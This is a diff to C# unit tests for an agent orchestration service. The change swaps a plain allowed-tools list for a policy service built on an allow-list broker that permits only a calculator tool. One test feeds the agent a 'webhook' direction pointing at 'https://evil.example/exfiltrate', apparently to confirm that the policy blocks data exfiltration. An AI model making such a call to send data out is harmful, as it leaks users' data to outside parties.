@@ -6,6 +6,8 @@
 using FluentAssertions;
 using Moq;
 using Standard.Agents.Models.Orchestrations.Agents;
+using Standard.Agents.Brokers.Policies;
+using Standard.Agents.Services.Foundations.Policys;
 using Standard.Agents.Services.Orchestrations.Direction;
 using Xunit;
 
@@ -22,7 +24,9 @@ public partial class DirectionOrchestrationServiceTests
             externalToolService: this.externalToolServiceMock.Object,
             returnService: this.returnServiceMock.Object,
             loggingBroker: this.loggingBrokerMock.Object,
-            allowedTools: ["calculator"]);
+            policyService: new PolicyService(
+                new AllowListPolicyBroker(["calculator"]),
+                this.loggingBrokerMock.Object));
 
         AgentContext inputContext =
             CreateContextWithDirection("webhook", "https://evil.example/exfiltrate");
@@ -55,7 +59,9 @@ public partial class DirectionOrchestrationServiceTests
             externalToolService: this.externalToolServiceMock.Object,
             returnService: this.returnServiceMock.Object,
             loggingBroker: this.loggingBrokerMock.Object,
-            allowedTools: ["calculator"]);
+            policyService: new PolicyService(
+                new AllowListPolicyBroker(["calculator"]),
+                this.loggingBrokerMock.Object));
 
         AgentContext inputContext = CreateContextWithDirection("calculator", "2 + 2");
 
